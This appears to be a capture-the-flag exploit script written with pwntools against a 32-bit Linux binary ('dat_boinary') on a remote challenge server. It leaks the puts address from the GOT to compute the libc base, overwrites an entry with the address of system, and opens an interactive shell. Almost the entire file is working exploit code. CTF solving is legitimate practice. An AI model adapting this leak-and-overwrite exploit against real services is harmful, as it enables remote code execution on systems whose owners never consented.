from pwn import *
context(arch='i386', os='linux') # <-- Add the architecture and os

binary = ELF("dat_boinary")
libc = ELF("libc.so.6")
# Generate PLT stubs
#malloc_plt = "\xb0\x84\x04\x08"
#fread_plt = "\xa0\x84\x04\x08"
#fgets_plt = "\x80\x84\x04\x08"
#printf_plt = "\x70\x84\x04\x08"
#strlen_plt = "\xe0\x84\x04\x08"
#puts_plt = "\xc0\x84\x04\x08"
#atoi_plt = "\x00\x85\x04\x08"
#setbuf_plt = "\x60\x84\x04\x08"

HOST,PORT = "problems.ctfx.io",1337
#r=process("./dat_boinary")
r=remote(HOST,PORT)
r.sendline("12345678")
r.sendline("5")
r.sendline("1")
#r.sendline("12345678" + p32(binary.symbols['got.puts'])*2 + "\n"*5)
r.sendline("12345678" + p32(0x08049118)*2 + "\n"*5)
r.sendline("4")
time.sleep(0.1)
#print r.recv(10000)
print r.recvuntil(":\t")
a=(r.recvline())
libc_base = int( a[0:4][::-1].encode("hex"),16) - libc.symbols['puts']
print hex(libc_base)
system = libc_base + libc.symbols["system"]
print a
r.sendline("2")
print r.recv(4000)
print "ayy lmao"
r.sendline("5")
print r.recv(4000)
r.sendline("3")
r.sendline(p32(system) )
r.sendline("5")
r.interactive()
print r.recv(4000)
# r=remote(HOST,PORT)
# socat tcp-listen:1337,fork,reuseaddr exec:"strace ./exercise-5"
